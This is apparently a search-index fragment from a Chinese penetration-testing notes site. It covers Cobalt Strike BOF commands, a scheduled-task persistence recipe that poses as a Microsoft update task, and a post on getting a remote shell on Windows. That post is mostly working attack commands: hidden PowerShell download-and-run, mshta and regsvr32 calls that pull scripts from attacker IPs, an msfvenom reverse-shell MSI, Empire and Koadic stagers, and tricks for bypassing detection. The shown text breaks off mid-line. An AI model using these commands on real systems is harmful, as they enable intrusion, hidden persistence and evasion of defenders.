\u5176\u4ed6\u53ef\u6539\u7684\u6709\u8ba1\u5212\u4efb\u52a1\u540d\u79f0\uff0c\u5f00\u59cb\u65f6\u95f4\u7ed3\u675f\u65f6\u95f4\u7b49\u7b49\u3002\u8fd9\u4e2a\u8ddf\u8ba1\u5212\u4efb\u52a1\u7684\u8def\u5f84\u4e00\u6837\uff0c\u8bbe\u7f6e\u5f97\u8d8a\u8d8a\u6df7\u6dc6\uff0c\u8d8a\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 schtaskscreate\u9700\u8981\u7ed9\u4e00\u4e2a\u8def\u5f84\uff0c\u8fd9\u4e2a\u8def\u5f84\u4e0d\u662f\u6587\u4ef6\u7684\u7269\u7406\u8def\u5f84\uff0c\u800c\u662f \u8ba1\u5212\u4efb\u52a1\u7684\u8def\u5f84 \uff0c\u7c7b\u4f3c/XXX/XXXX\u3002\u8def\u5f84\u4e0d\u5bf9bof\u6267\u884c\u4f1a\u62a5\u9519\u3002 <Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <Source>Microsoft Corporation.</Source> <Author>Microsoft Corporation.</Author> <Description>Keep your Microsoft software up-to-date. If this task is disabled or stopped, the Microsoft software will not be able to stay up to date, which means that possible security holes cannot be fixed, and the function may not be available. If no Microsoft software is using this task, it will uninstall itself</Description> <SecurityDescriptor>D:(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)</SecurityDescriptor> </RegistrationInfo> <Triggers> <TimeTrigger> <Repetition> <Interval>PT50M</Interval> <StopAtDurationEnd>false</StopAtDurationEnd> </Repetition> <StartBoundary>2005-10-11T13:21:17-08:00</StartBoundary> <EndBoundary>2036-01-01T00:00:00-08:00</EndBoundary> <Enabled>true</Enabled> </TimeTrigger> </Triggers> <Principals> <Principal> <UserId>S-1-5-21-1083132562-1065254770-2819855764-1000</UserId> </Principal> </Principals> <Settings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> </Settings> <Actions> <Exec> <Command>c:\\windows\\system32\\SyspartRepair.exe</Command> </Exec> </Actions> </Task>","title":"trustedsec BOF\u63d2\u4ef6\u8bf4\u660e\u6587\u6863"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#situational-awareness","text":"","title":"Situational-Awareness"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sacna","text":"","title":"SA.cna"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#dir","text":"\u67e5\u770b\u5f53\u524d\u76ee\u5f55","title":"dir"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#env","text":"\u67e5\u770b\u73af\u5883\u53d8\u91cf","title":"env"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#ldapsearch","text":"ldapsearch\u5de5\u5177 beacon> ldapsearch [-] ldapsearch <query> [comma_separated_attributes] [result_count] [DC hostname or IP] [Distingished Name to use] \"\" works as a default for attributes (get all) DC hostname / IP (use Primary DC) and distingished name (use Base domain Level) 0 works as default for result_count (get all) Useful queries: - Kerberoastable: (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) - AS-REP Roastable: (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) - Passwords stored with reversible encryption: (&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128)) If this fails with an error about paging not being supported you can try tou se nonpagedldapsearch instead (its unregistered but has the same arguments)","title":"ldapsearch"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#ipconfig","text":"\u770b\u7f51\u7edc","title":"ipconfig"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#arp","text":"\u770barp\u8868","title":"arp"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#resources","text":"\u78c1\u76d8\u7a7a\u95f4","title":"resources"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#uptime","text":"\u5f00\u673a\u65f6\u95f4","title":"uptime"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#tasklist","text":"","title":"tasklist"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#nslookup","text":"beacon> nslookup [-] Synopsis: nslookup <lookup value> <lookup server> <TYPE> Perform a DNS Query: <lookup value> is the ip or hostname you want to query <lookup server> is the server you want to query (use 0 or exclude for system default) <TYPE> record type to query","title":"nslookup"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#listdns","text":"\u67e5\u770bdns\u7f13\u5b58","title":"listdns"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#listmods","text":"\u67e5\u770b\u8fdb\u7a0b\u52a0\u8f7d\u7684\u6a21\u5757","title":"listmods"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#locale","text":"\u67e5\u770b\u65e5\u671f\u65f6\u95f4\u56fd\u5bb6","title":"locale"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#adcs_enumadcs_enum_comadcs_enum_com2","text":"\u679a\u4e3eadcs\u670d\u52a1\u5668\u7684CA\u6a21\u677f","title":"adcs_enum\u3001adcs_enum_com\u3001adcs_enum_com2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#vssenum","text":"\u679a\u4e3e\u5feb\u7167","title":"vssenum"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#get_password_policy","text":"\u5bc6\u7801\u7b56\u7565","title":"get_password_policy"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#probe","text":"\u7aef\u53e3\u626b\u63cf","title":"probe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#notepad","text":"\u4ece\u6253\u5f00\u7684\u8bb0\u4e8b\u672c\u4e2d\u83b7\u53d6\u6587\u672c","title":"notepad"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netuse_add","text":"\u5efa\u7acb\u4e00\u4e2aIPC\u8fde\u63a5 Example: Bind IPC$ of a remote computer using current user context netuse_add \\\\somedc.somedomain.local\\IPC$ \"\" \"\" Map a Share without creating a specific device mapping using current user context netuse_add \\\\fileshare.somedomain.local\\adminstuff \"\" \"\" Map a Share without creating a specific device mapping, using a diferent set of credentials netuse_add \\\\fileshare.somedomain.local\\adminstuff someuser SomeUsersPassword /DEVICE:F Map a persistent share in the current user context netuse_add \\\\fileshare.somedomain.local\\userdrive \"\" \"\" /PERSIST","title":"netuse_add"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netuse_list","text":"\u67e5\u770bIPC\u8fde\u63a5","title":"netuse_list"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netuse_delete","text":"\u5220\u9664IPC\u8fde\u63a5","title":"netuse_delete"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netuser","text":"\u67e5\u770b\u7528\u6237\u4fe1\u606f","title":"netuser"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#windowlist","text":"\u67e5\u770b\u53ef\u89c1\u7a97\u53e3","title":"windowlist"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netstat","text":"\u67e5\u770b\u7f51\u7edc\u8fde\u63a5","title":"netstat"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#routeprint","text":"\u67e5\u770b\u8def\u7531","title":"routeprint"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#whoami","text":"","title":"whoami"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#userenum","text":"\u679a\u4e3e\u7528\u6237","title":"userenum"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#domainenum","text":"\u679a\u4e3e\u57df","title":"domainenum"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#driversigs","text":"\u67e5\u770bedr","title":"driversigs"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#enum_filter_driver","text":"\u67e5\u770b\u6740\u6bd2","title":"enum_filter_driver"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netsharesnetsharesadmin","text":"\u67e5\u770b\u7f51\u7edc\u5171\u4eab","title":"netshares\u3001netsharesAdmin"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netgrouplist","text":"\u67e5\u770b\u57df\u7ec4","title":"netGroupList"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netgrouplistmembers","text":"\u67e5\u770b\u57df\u7ec4\u6240\u5c5e netGroupListMembers: <Group Name> <opt: domainname>","title":"netGroupListMembers"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netlocalgrouplist","text":"\u67e5\u770b\u7ec4","title":"netLocalGroupList"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netlocalgrouplistmembers","text":"","title":"netLocalGroupListMembers"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#schtasksenum","text":"\u679a\u4e3e\u8ba1\u5212\u4efb\u52a1","title":"schtasksenum"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#schtasksquery","text":"\u67e5\u8be2\u6307\u5b9a\u8ba1\u5212\u4efb\u52a1","title":"schtasksquery"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#cacls","text":"\u67e5\u770b\u7a0b\u5e8f\u7684\u6743\u9650","title":"cacls"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sc_query","text":"\u67e5\u770b\u670d\u52a1","title":"sc_query"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sc_qc","text":"\u67e5\u8be2\u670d\u52a1\u914d\u7f6e","title":"sc_qc"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sc_qdescription","text":"\u67e5\u8be2\u670d\u52a1\u63cf\u8ff0","title":"sc_qdescription"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sc_qfailure","text":"","title":"sc_qfailure"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sc_qtriggerinfo","text":"","title":"sc_qtriggerinfo"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#sc_enum","text":"","title":"sc_enum"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#reg_query","text":"","title":"reg_query"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#reg_query_recursive","text":"","title":"reg_query_recursive"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netview","text":"","title":"netview"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#wmi_query","text":"","title":"wmi_query"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#netsession","text":"","title":"netsession"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#adv_audit_policies","text":"","title":"adv_audit_policies"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#listpipes","text":"","title":"listpipes"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#findloadedmodule","text":"","title":"findLoadedModule"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/#schtaskscreate","text":"\u6ce8\u610f\u4fee\u6539xml\u6587\u4ef6-PT50M.xml \u5927\u90e8\u5206\u4e0d\u7528\u52a8\uff0c\u9700\u8981\u4fee\u6539\u7684\u5730\u65b9\u6709 PT50M \u6bcf\u969450\u5206\u949f\u542f\u52a8\u6267\u884c\u4e00\u6b21 S-1-5-21-1083132562-1065254770-2819855764-1000 \u4ee5\u54ea\u4e2a\u7528\u6237\u6267\u884c \u9700\u8981\u67e5\u770b\u5f53\u524d\u7528\u6237\u7684UID c:\\windows\\system32\\SyspartRepair.exe \u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84 \u5176\u4ed6\u53ef\u6539\u7684\u6709\u8ba1\u5212\u4efb\u52a1\u540d\u79f0\uff0c\u5f00\u59cb\u65f6\u95f4\u7ed3\u675f\u65f6\u95f4\u7b49\u7b49\u3002\u8fd9\u4e2a\u8ddf\u8ba1\u5212\u4efb\u52a1\u7684\u8def\u5f84\u4e00\u6837\uff0c\u8bbe\u7f6e\u5f97\u8d8a\u8d8a\u6df7\u6dc6\uff0c\u8d8a\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 schtaskscreate\u9700\u8981\u7ed9\u4e00\u4e2a\u8def\u5f84\uff0c\u8fd9\u4e2a\u8def\u5f84\u4e0d\u662f\u6587\u4ef6\u7684\u7269\u7406\u8def\u5f84\uff0c\u800c\u662f \u8ba1\u5212\u4efb\u52a1\u7684\u8def\u5f84 \uff0c\u7c7b\u4f3c/XXX/XXXX\u3002\u8def\u5f84\u4e0d\u5bf9bof\u6267\u884c\u4f1a\u62a5\u9519\u3002 <Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <Source>Microsoft Corporation.</Source> <Author>Microsoft Corporation.</Author> <Description>Keep your Microsoft software up-to-date. If this task is disabled or stopped, the Microsoft software will not be able to stay up to date, which means that possible security holes cannot be fixed, and the function may not be available. If no Microsoft software is using this task, it will uninstall itself</Description> <SecurityDescriptor>D:(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)</SecurityDescriptor> </RegistrationInfo> <Triggers> <TimeTrigger> <Repetition> <Interval>PT50M</Interval> <StopAtDurationEnd>false</StopAtDurationEnd> </Repetition> <StartBoundary>2005-10-11T13:21:17-08:00</StartBoundary> <EndBoundary>2036-01-01T00:00:00-08:00</EndBoundary> <Enabled>true</Enabled> </TimeTrigger> </Triggers> <Principals> <Principal> <UserId>S-1-5-21-1083132562-1065254770-2819855764-1000</UserId> </Principal> </Principals> <Settings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> </Settings> <Actions> <Exec> <Command>c:\\windows\\system32\\SyspartRepair.exe</Command> </Exec> </Actions> </Task>","title":"\u8ba1\u5212\u4efb\u52a1\u51fd\u6570schtaskscreate\u7684\u4f7f\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/","text":"title: \u5728\u547d\u4ee4\u6267\u884c\u7684\u60c5\u51b5\u4e0b\u4e0a\u7ebf\u7684\u51e0\u79cd\u65b9\u5f0f-Windows date: 2021-01-13 08:49:37 \u8fdc\u7a0b\u6267\u884c Powershell \u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c+base64 \u4e0b\u8f7d\u5e76base64 $fileContent = \"(new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'\" $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent); $encoded = [System.Convert]::ToBase64String($bytes); $encoded \u6267\u884c powershell -WindowStyle Hidden -enc base64 mshta\u65b9\u5f0f \u6267\u884cvb >mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"calc.exe\",0,true)(window.close) Js >mshta javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im mshta.exe\",0,true);} Jsrat >mshta javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.2.101:9998/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im mshta.exe\",0,true);} metaspolit\u6a21\u5757 use exploit/windows/misc/hta_server mshta xxx \u6267\u884cmshta xxxxx \u914d\u5408CACTUSTORCH \u4e0b\u8f7d https://github.com/mdsecactivebreach/CACTUSTORCH \u751f\u6210raw\u683c\u5f0f\u7684shellcode\u5e76base64 base64\u4ece\u6587\u4ef6\u5feb\u901f\u7f16\u7801\u547d\u4ee4\uff1acat 1.bin |base64 -w 0 \u4fee\u6539CACTUSTORCH.hta\u6587\u4ef6\u4e2dDim code\u5904\u7684\u5185\u5bb9\u4e3abase64\u540e\u7684shellcode \u6267\u884cmshta http://x.x.x.x/CACTUSTORCH.hta \u914d\u5408GreatSCT use Bypass use mshta/shellcode_inject/base64_migrate msiexec\u65b9\u5f0f \u53ef\u4ee5\u5c06msi\u540e\u7f00\u6539\u4e3apng metaspolit\u6a21\u5757 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 \u2013f msi > shell.msi msiexec /q /i http://x.x.x.x/shell.msi \u81ea\u7f16\u8bd1msi \u4fee\u6539\u6076\u610fmsi.wix\u6587\u4ef6\u4e2d\u8981\u6267\u884c\u7684\u547d\u4ee4 <?xml version=\"1.0\"?> <Wix xmlns=\"http://schemas.microsoft.com/wix/2006/wi\"> <Product Id=\"*\" UpgradeCode=\"12345678-1234-1234-1234-111111111111\" Name=\"Example Product Name\" Version=\"0.0.1\" Manufacturer=\"@_xpn_\" Language=\"1033\"> <Package InstallerVersion=\"200\" Compressed=\"yes\" Comments=\"Windows Installer Package\"/> <Media Id=\"1\" /> <Directory Id=\"TARGETDIR\" Name=\"SourceDir\"> <Directory Id=\"ProgramFilesFolder\"> <Directory Id=\"INSTALLLOCATION\" Name=\"Example\"> <Component Id=\"ApplicationFiles\" Guid=\"12345678-1234-1234-1234-222222222222\"> </Component> </Directory> </Directory> </Directory> <Feature Id=\"DefaultFeature\" Level=\"1\"> <ComponentRef Id=\"ApplicationFiles\"/> </Feature> <Property Id=\"cmdline\">calc </Property> <CustomAction Id=\"SystemShell\" Execute=\"deferred\" Directory=\"TARGETDIR\" ExeCommand='[cmdline]' Return=\"ignore\" Impersonate=\"no\"/> <CustomAction Id=\"FailInstall\" Execute=\"deferred\" Script=\"vbscript\" Return=\"check\"> invalid vbs to fail install </CustomAction> <InstallExecuteSequence> <Custom Action=\"SystemShell\" After=\"InstallInitialize\"></Custom> <Custom Action=\"FailInstall\" Before=\"InstallFiles\"></Custom> </InstallExecuteSequence> </Product> </Wix> \u4f7f\u7528wix\u5de5\u5177\u7f16\u8bd1\u751f\u6210msi candle.exe msi.wix light.exe xxx.wixobj exe\u8f6cmsi \u4f7f\u7528exe2msi.msi\u5de5\u5177\u5c06exe\u8f6c\u4e3amsi \u5982\u679cexe\u662f\u514d\u6740\u7684\uff0c\u90a3\u4e48\u8fd9\u6837\u4e00\u6765\u5c31\u53ef\u4ee5\u65e0\u9700exe\u843d\u5730\u5c31\u80fd\u8fdc\u7a0b\u6267\u884c regsvr32\u65b9\u5f0f \u914d\u5408metaspolit\u6a21\u5757 use exploit/multi/script/web_delivery regsvr32 /s /n /u /i:http://x.x.x.x/file.sct scrobj.dll \u914d\u5408empire uselistner http #\u5f00\u542f\u76d1\u542c set Host http://192.168.1.109 #\u8bbe\u7f6e\u76d1\u542c\u5730\u5740 execute #\u8fd0\u884c\u76d1\u542c usestager windows/launcher_sct #\u9009\u62e9\u6a21\u5757 set listener http #\u9009\u62e9\u76d1\u542c execute #\u8fd0\u884c\u6a21\u5757 regsvr /s /n /u /i:http://192.168.1.109:8080/tmp/launcher.sct scrobj.dll \u81ea\u5b9a\u4e49SCT\u6587\u4ef6 <?XML version=\"1.0\"?> <scriptlet> <registration progid=\"PoC\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\" > <!-- Proof Of Concept - Casey Smith @subTee --> <!-- License: BSD3-Clause --> <script language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </registration> </scriptlet> \u6267\u884c\uff1aregsvr32 /u /n /s /i:http://192.168.1.109/1.sct scrobj.dll \u914d\u5408koadic use stager/js/regsvr set srvhost 192.168.1.107 run regsvr32 /u /n /s /i:http;//192.168.1.107:9998/uWBjv scrobj.dll zombies 0 \u914d\u5408JSRat \u4e0b\u8f7dhttps://github.com/Hood3dRob1n/JSRat-Py \u5728\u672c\u673a\u6267\u884c./JSRat.py -I 0.0.0.0 -p 9999\u540e\uff0c\u811a\u672c\u4f1a\u81ea\u52a8\u751f\u6210\u547d\u4ee4 JSRat Server - Python Implementation By: Hood3dRob1n [*] Web Server Started on Port: 9999 [*] Awaiting Client Connection to: [*] rundll32 invocation: http://0.0.0.0:9999/connect [*] regsvr32 invocation: http://0.0.0.0:9999/file.sct [*] Client Command at: http://0.0.0.0:9999/wtf [*] Browser Hook Set at: http://0.0.0.0:9999/hook [-] Hit CTRL+C to Stop the Server at any time... \u914d\u5408GreatSCT use Bypass use regsvr/shellcode_iject/base64_migrate.py generate Bypass\u7684\u4e00\u4e9b\u65b9\u5f0f eyb\u548cfaq\u540e\u7f00\u7ed5\u8fc7 copy c:\\windows\\system32\\regsvr32.exe aa.eyb copy c:\\windows\\system32\\scrobj.dll aa.faq aa.eyb /s /i:http://127.0.0.1:8000/1.sct aa.faq \u4f7f\u7528\u547d\u4ee4\u7ed5\u8fc7 \u5b57\u7b26\u5e72\u6270 regsvr32 /u /n /s /i:h^t^t^p://192.168.122.1/2021.sct scrobj.dll regsvr32 /u /n /s /i:h\"t\"t\"p://192.168.122.1/2021.sct scrobj.dll \u6587\u4ef6\u590d\u5236 \u53ef\u4ee5\u590d\u5236\u4e24\u4e2a\u4e00\u8d77\u7528 copy c:\\windows\\system32\\regsvr32.exe C:\\Users\\Administrator\\Desktop\\alc.ac regs.exe /u /n /s /i:http://192.168.122.1/2021.sct scrobj.dll copy c:\\windows\\system32\\scrobj.dll newscrobj.dll regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct newscrobj.dll \u7b26\u53f7\u94fe\u63a5\uff0c\u9700\u8981\u94fe\u63a5\u7684dll\u76ee\u5f55\u4e0b\u8fdb\u884c Mklink.exe c:\\programdata\\Myscrobj.dll c:\\windows\\\\scrobj.dll regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct Myscrobj.dll \u6570\u636e\u6d41\uff08ADS\uff09 type c:\\windows\\system32\\scrobj.dll > test.txt:new1.dll regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct test.txt:new1.dll \u672c\u5730\u8fd0\u884c bitsadmin /transfer download /download /priority normal http://192.168.122.1/2021.sct %TEMP%\\new2021.txt && regsvr32.exe /s /u /i:%TEMP%\\new2021.txt scrobj.dll \u8fdc\u7a0b\u8c03\u7528\u672c\u5730\u52a0\u8f7d #include <stdio.h> #include <stdlib.h> #include 